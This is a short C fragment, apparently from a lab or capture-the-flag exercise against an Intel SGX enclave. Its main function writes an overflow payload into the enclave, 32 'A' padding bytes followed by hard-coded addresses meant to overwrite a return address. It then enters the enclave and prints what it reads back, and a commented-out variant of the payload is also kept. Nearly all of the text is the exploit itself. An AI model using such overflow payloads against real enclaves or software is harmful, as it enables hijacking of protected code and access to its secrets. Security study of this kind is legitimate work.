...
int main(int argc, char **argv)
{
    ...
    //sgx_host_write("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x78\x6d\x10\x50\x00\x00\x00\x00\x4f\x01\x00\x50\x00\x00\x00\x00", 50);
    sgx_host_write("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x78\x6d\x10\x50\x41\x41\x41\x41\x4f\x01\x00\x50\x00\x00\x00\x00", 50);
    sgx_enter(tcs, aep);
    sgx_host_read(result, 20);
    printf("Host read: %s\n", result);
